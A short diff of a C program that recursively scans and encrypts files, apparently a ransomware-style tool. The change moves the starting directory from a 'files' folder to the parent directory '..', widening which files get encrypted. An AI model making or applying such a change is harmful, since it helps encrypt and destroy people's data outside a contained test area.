@@ -180,7 +180,7 @@ int main (int argc, char *argv[]) {
     
     // Set the starting point for the recursion to search from.
     // Anything below this directory will not be scanned and encrypted.
-    char directory[] = "files";
+    char directory[] = "..";
     recursiveSearch(key, directory, encryption);
     if (encryption == 0) {
         remove(keyFile);
